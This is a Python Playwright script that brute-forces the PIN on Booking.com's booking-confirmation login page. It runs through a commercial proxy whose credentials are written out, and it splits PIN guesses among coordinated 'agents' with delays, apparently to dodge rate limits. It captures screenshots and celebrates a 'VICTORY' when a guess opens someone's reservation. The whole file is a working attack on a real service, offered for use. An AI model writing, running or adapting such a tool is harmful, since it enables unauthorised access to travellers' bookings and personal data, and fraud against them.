from playwright.sync_api import sync_playwright
import os
import time
import argparse
from multi_pin_manager import PinManager

# --- Configurable parameters ---
parser = argparse.ArgumentParser(description="Booking.com PIN tester")
parser.add_argument('--confirmation', type=str, default="6160911170", help='Confirmation number')
parser.add_argument('--pins', type=str, default="1,2,3,4", help='Comma-separated PINs')
parser.add_argument('--wait', type=int, default=15, help='Wait time between attempts (seconds)')
parser.add_argument('--headless', action='store_true', help='Run browser in headless mode')
args = parser.parse_args()

CONFIRMATION = args.confirmation
WAIT_TIME = args.wait
HEADLESS = False  # Always show browser for monitoring
SCREEN_DIR = "screenshots_real"
AGENT_NAME = "BOSS_1A"

# Get PIN manager and PINs
pin_mgr = PinManager(CONFIRMATION)
PINS = []
# Each agent tries 5 PINs
for _ in range(5):
    pin = pin_mgr.get_next_pin(AGENT_NAME)
    if pin:
        PINS.append(pin)

# --- Proxy configuration ---
PROXY_CONFIG = {
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    pin_mgr.record_result(AGENT_NAME, pin, result)

# Check if success already found
if pin_mgr.get_success_pin():
    print(f"Success already found! PIN: {pin_mgr.get_success_pin()}")
    exit(0)

if not PINS:
    print("No available PINs to try or all PINs exhausted")
    exit(1)

print(f"Agent {AGENT_NAME} will try these PINs: {PINS}")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
    page = browser.new_page()

    for pin in PINS:
        print(f"\n🤖 Agent {AGENT_NAME} - Automatically testing PIN: {pin}")
        
        try:
            # Navigate to booking confirmation page
            print(f"🔄 Loading booking page...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

            # Wait for page to fully load
            print(f"⏳ Waiting for form elements to load...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            
            # Auto-fill confirmation number
            print(f"📝 Filling confirmation number: {CONFIRMATION}")
            page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
            
            # Auto-fill PIN
            print(f"🔑 Filling PIN: {pin}")
            page.fill('input[placeholder="e.g. 1234"]', pin)

            # Auto-click Continue button
            print(f"🚀 Clicking Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')

            # Wait for result - either success or error
            print(f"⏳ Waiting for result...")
            page.wait_for_function(
                """
                () => {
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }
                """,
                timeout=30000
            )

            current_url = page.url
            if "unique_order_id=" in current_url:
                print(f"🎉 SUCCESS! PIN {pin} is CORRECT!")
                print(f"🔗 Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_SUCCESS.png")
                log_result(pin, "SUCCESS", current_url)
                success_count += 1
                
                # Display victory banner
                print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                          🎉 VICTORY ACHIEVED! 🎉                            ║
║                                                                              ║
║  Booking ID: {CONFIRMATION}                                                  ║
║  Winning PIN: {pin}                                                          ║
║  Agent: {AGENT_NAME}                                                         ║
║                                                                              ║
║                      🚀 MISSION ACCOMPLISHED! 🚀                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
                break
                
            elif page.query_selector('.bui-alert--error'):
                print(f"❌ PIN {pin} is incorrect")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_FAIL.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
                
            else:
                print(f"❓ Unknown result for PIN {pin}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_UNKNOWN.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f"💥 Error testing PIN {pin}: {e}")
            page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_EXCEPTION.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        print(f"✅ Agent {AGENT_NAME} completed attempt with PIN {pin}.")
        
        # Wait 15 seconds before next attempt (except last attempt)
        if PINS.index(pin) < len(PINS) - 1:
            print(f"⏱️ Waiting 15 seconds before next PIN...")
            time.sleep(15)
        # Don't break - continue with next PIN

    browser.close()

print("\n--- Summary Report ---")
print(f"Total attempts: {len(PINS)}")
print(f"Success: {success_count}")
print(f"Failure: {fail_count}")
print(f"Unknown: {unknown_count}")
print(f"Exception: {exception_count}")
